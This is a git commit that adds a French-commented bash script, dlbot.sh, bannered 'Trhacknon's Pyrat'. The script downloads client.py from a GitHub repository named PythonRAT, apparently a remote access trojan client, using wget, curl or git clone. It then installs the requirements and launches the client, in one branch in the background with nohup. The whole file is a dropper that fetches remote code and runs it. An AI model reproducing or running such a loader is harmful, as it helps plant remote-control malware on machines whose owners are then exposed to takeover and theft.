1c1dde8c4ab8f42f439400df753afb27e2e433a5
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2024-01-22 08:16:28 +0100

    Create dlbot.sh

---
+++ dlbot.sh
@@ -0,0 +1,41 @@
+#!/bin/bash
+
+# Fonction pour afficher la bannière colorée
+display_banner() {
+    echo -e "\e[0;31mTrhacknon's Pyrat\e[0m"
+}
+
+# Fonction pour demander confirmation
+confirm() {
+    read -r -p "$1 [Y/n] " response
+    if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ || "$response" == "" ]]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Afficher la bannière
+display_banner
+
+# Télécharger le client.py avec wget
+confirm "Voulez-vous télécharger client.py avec wget?" && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py
+
+# Vérifier si le téléchargement avec wget a réussi
+if [ $? -ne 0 ]; then
+    # Essayer de télécharger avec curl
+    confirm "Le téléchargement avec wget a échoué. Voulez-vous essayer avec curl?" && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt
+fi
+
+# Vérifier si le téléchargement avec curl a réussi
+if [ $? -ne 0 ]; then
+    # Cloner le repo en cas d'échec avec wget et curl
+    confirm "Le téléchargement avec curl a échoué. Voulez-vous cloner le repo avec git?" && git clone https://github.com/tucommenceapousser/PythonRAT
+    cd PythonRAT || exit
+
+    # Lancer le client.py
+    confirm "Voulez-vous lancer client.py?" && python src/client.py
+else
+    # Lancer le client.py téléchargé avec curl
+    confirm "Voulez-vous lancer client.py téléchargé avec curl?" && mkdir srcc && cp requirements.txt srcc/ && cp client.py srcc/ && pip install -r srcc/requirements.txt --force --use-feature=content-addressable-pool && nohup python srcc/client.py &
+fi
